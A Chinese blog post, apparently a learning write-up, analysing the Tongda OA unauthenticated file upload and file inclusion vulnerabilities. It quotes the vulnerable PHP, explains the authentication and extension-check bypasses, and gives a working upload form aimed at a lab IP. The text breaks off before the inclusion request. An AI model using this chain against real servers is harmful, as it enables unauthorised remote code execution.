{"title":"通达OA未授权任意文件上传及文件包含漏洞分析学习","uid":"bcc4c805c00a13a68269e7322cfcb1df","slug":"通达OA未授权任意文件上传及文件包含漏洞分析学习","date":"2020-04-18T01:37:32.000Z","updated":"2020-09-30T04:22:22.000Z","comments":true,"path":"api/articles/通达OA未授权任意文件上传及文件包含漏洞分析学习.json","keywords":"A1andNS","cover":"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200418094130.jpg","content":"<p>今年3月份通达OA爆出了文件上传和文件包含漏洞，网络上很多复现和分析的博客，今天我也来试着分析分析，据360灵腾安全实验室判断该漏洞等级为高，利用难度低，威胁程度高，所以可能比较适合代码审计的新手来练练。</p>\n<h2 id=\"0x00-漏洞概述\"><a href=\"#0x00-漏洞概述\" class=\"headerlink\" title=\"0x00 漏洞概述\"></a>0x00 漏洞概述</h2><p><code>通达OA（Office Anywhere网络智能办公系统）</code>是由北京通达信科科技有限公司自主研发的协同办公自动化系统，包括流程审批、行政办公、日常事务、数据统计分析、即时通讯、移动办公等。</p>\n<p>该漏洞在绕过身份验证的情况下通过文件上传漏洞上传恶意php文件，组合文件包含漏洞最终造成远程代码执行漏洞，从而导致可以控制服务器system权限。</p>\n<h2 id=\"0x01-任意文件上传\"><a href=\"#0x01-任意文件上传\" class=\"headerlink\" title=\"0x01 任意文件上传\"></a>0x01 任意文件上传</h2><p>网上很多信息，存在漏洞的文件就是<code>ispirit/im/upload.php</code></p>\n<p>由于php文件都是通过zend加密的，所以还需要zend解密工具解密才行。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200418110727.png\" alt=\"seayDzend\"></p>\n<p>至于<code>zend</code>解密工具，自行百度就OK了。</p>\n<p>那么就来看看存在问题的那段代码吧！</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$P</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"P\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$P</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$P</span> <span class=\"token operator\">!=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token function\">ob_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">include_once</span> <span class=\"token string double-quoted-string\">\"inc/session.php\"</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">session_id</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$P</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">session_write_close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">//如果有传递参数P，就可以绕过执行auth.php了，也就可以绕过了登录验证进行文件上传了。</span>\n<span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span> \n\t<span class=\"token keyword\">include_once</span> <span class=\"token string double-quoted-string\">\"./auth.php\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>if-else语句一旦编写时出现判断失误，就会出现必要的执行步骤被忽略的可能。</p>\n<p>我用<code>burpsuite</code>来试一下吧，如果直接在未登录情况下访问这个url是会提示用户未登录的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200419134308.png\" alt=\"未登录\"></p>\n<p>如果我传入一个P参数提交，就会发现成功绕过了登录认证，并且<code>PHPSESSID</code>被设置为了P参数。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200419134233.png\" alt=\"传入P\"></p>\n<p>接下来继续看又有一个<code>IF-else语句</code>，是判断<code>DEST_UID</code>的</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$TYPE</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"TYPE\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$DEST_UID</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"DEST_UID\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$dataBack</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$DEST_UID</span> <span class=\"token operator\">!=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span><span class=\"token function\">td_verify_ids</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ids</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\t<span class=\"token comment\">//验证DEST_UID是否为非数字</span>\n\t<span class=\"token variable\">$dataBack</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"status\"</span> <span class=\"token operator\">=></span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"content\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"-ERR \"</span> <span class=\"token operator\">.</span> <span class=\"token function\">_</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"接收方ID无效\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">echo</span> <span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">data2utf8</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dataBack</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$DEST_UID</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\",\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!==</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token variable\">$DEST_UID</span> <span class=\"token operator\">=</span> <span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$DEST_UID</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//若DEST_UID为空或0那么DEST_UID都为0</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$DEST_UID</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//如果DEST_UID为0</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$UPLOAD_MODE</span> <span class=\"token operator\">!=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token variable\">$dataBack</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"status\"</span> <span class=\"token operator\">=></span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"content\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"-ERR \"</span> <span class=\"token operator\">.</span> <span class=\"token function\">_</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"接收方ID无效\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">echo</span> <span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">data2utf8</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dataBack</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>所以我需要传入一个不为空和0的数字就可以了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200419123400.png\" alt=\"P&amp;DEST_UID\"></p>\n<p>这里有报错是因为我没有去上传文件。接下来继续看函数。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">&lt;=</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">//只要全局变量1&lt;=count($_FILES)就OK</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$UPLOAD_MODE</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"ATTACHMENT\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"ATTACHMENT\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"ATTACHMENT\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"ATTACHMENT\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">//执行upload</span>\n\t<span class=\"token variable\">$ATTACHMENTS</span> <span class=\"token operator\">=</span> <span class=\"token function\">upload</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"ATTACHMENT\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$MODULE</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里是只要全局变量<code>1&lt;=count($_FILES)</code>就OK了，可以执行下面内容，也就是说有文件上传的时候就会去调用upload函数。</p>\n<p>那就看看<code>upload函数</code>，它在<code>inc/utility_file.php</code>中，主要是看上传允许的后缀问题，但是这用的是getshell方式，而getshell方式是文件包含，所以不饶过也是可以的了。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$ATTACH_ERROR</span> <span class=\"token operator\">==</span> <span class=\"token constant\">UPLOAD_ERR_OK</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_uploadable</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ATTACH_NAME</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t\t\t<span class=\"token variable\">$ERROR_DESC</span> <span class=\"token operator\">=</span> <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span><span class=\"token function\">_</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"禁止上传后缀名为[%s]的文件\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ATTACH_NAME</span><span class=\"token punctuation\">,</span> <span class=\"token function\">strrpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ATTACH_NAME</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里调用了一个<code>is_uploadable()</code>函数，跟进去看一下这个函数，这个函数也是在<code>inc/utility_file.php</code>里。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">function</span> <span class=\"token function\">is_uploadable</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$FILE_NAME</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token variable\">$POS</span> <span class=\"token operator\">=</span> <span class=\"token function\">strrpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$FILE_NAME</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$POS</span> <span class=\"token operator\">===</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token variable\">$EXT_NAME</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$FILE_NAME</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$FILE_NAME</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$POS</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n\n\t\t<span class=\"token variable\">$EXT_NAME</span> <span class=\"token operator\">=</span> <span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$FILE_NAME</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$POS</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里主要是寻找<code>.</code>出现过的最后一次处，然后寻找后三个字符，并且将其通过<code>strtolower()</code>转换为小写，然后比对是否是<code>&#39;php&#39;</code>，所以如果要绕过后缀验证，只要在最后加一个<code>.</code>就可以了。</p>\n<p>接下来看一下<code>UPLOAD_MODE</code>判断结构。可以看出来它的主要作用是判断类型回显相应的内容，参数的值有1，2，3,但是这个<code>UPLOAD_MODE</code>参数是怎么来的我就不太知道了，在<code>upload.php</code>文件里没有找到<code>UPLOAD_MODE</code>的来源，有可能是文件包含过来的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200419123347.png\" alt=\"UPLOAD_MODE\"></p>\n<p>接下来我们继续分析关于Path的问题，首先是看到了FILE_PATH参数。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200419135028.png\" alt=\"ATTACHMENT\"></p>\n<p>可以看到他和<code>ATTACHMENT_ID</code>和<code>ATTACHMENT_NAME</code>有关，我们跟进定位去看一下这两个参数，发现它们都来源自<code>ATTACHMENTS</code>参数。而<code>ATTACHMENTS</code>又是<code>upload()</code>函数的返回结果。</p>\n<p>而这两个参数来之对应的<code>ATTACHMENTS[&quot;ID&quot;]</code>和<code>ATTACHMENTS[&quot;NAME&quot;]</code>，而根据网上的文章，它们来源于<code>add_attach</code>函数，而add_attach函数也是在<code>inc/utility_file.php</code>文件下。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200419193357.png\" alt=\"add_attach\"></p>\n<p>那么就跟进到<code>add_attach</code>里看一下是什么样的。我们可以从函数里面看到保存路径，FILENAME。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200419193911.png\" alt=\"PATH\"></p>\n<p>查看<code>add_attach</code>函数的返回值，返回值中包含了文件路径以及自定义的文件名，现在我们返回到<code>upload</code>函数</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200419195542.png\" alt=\"add_attach函数的返回值\"></p>\n<p>这里要上传可以使用以下的html：</p>\n<pre class=\"line-numbers language-html\" data-language=\"html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>frmUpload<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">enctype</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>multipart/form-data<span class=\"token punctuation\">\"</span></span>\n      <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://192.168.0.109:80/ispirit/im/upload.php<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>post<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Upload a new file:<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>hidden<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>P<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>666<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>hidden<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>TYPE<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>666<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>hidden<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>DEST_UID<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>1<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>file<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>ATTACHMENT<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">size</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>50<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>hidden<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>UPLOAD_MODE<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>1<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>btUpload<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Upload<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>我首先上传了一个jpg图像，回显告诉我一切正常。我在使用<code>.</code>绕过后很奇怪的（这里上传的是PHP文件），回显依旧是报错的，这让我很困惑。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200419221721.png\" alt=\"回显信息\"></p>\n<p>我决定去看一下上传目录，结果发现居然是上传成功了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200419221500.png\" alt=\"上传目录\"></p>\n<p>我总感觉我的漏洞环境似乎没有搞好，后来还好从大佬哪里拿到了一个漏洞完整版本，所以就很顺利的成功复现了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200420220057.png\" alt=\"上传php成功\"></p>\n<h2 id=\"0x02-文件包含漏洞\"><a href=\"#0x02-文件包含漏洞\" class=\"headerlink\" title=\"0x02 文件包含漏洞\"></a>0x02 文件包含漏洞</h2><p>根据网上诸多的信息，文件包含漏洞是位于ispirit/interface/gateway.php</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span> <span class=\"token operator\">!=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token variable\">$url</span> <span class=\"token operator\">=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"general/\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!==</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"ispirit/\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!==</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"module/\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!==</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token keyword\">include_once</span> <span class=\"token variable\">$url</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//只需要存在general/ ispirit/ module/ 这几个中的任何一个字符串就可以</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>构造一个</p>\n<pre class=\"line-numbers language-url\" 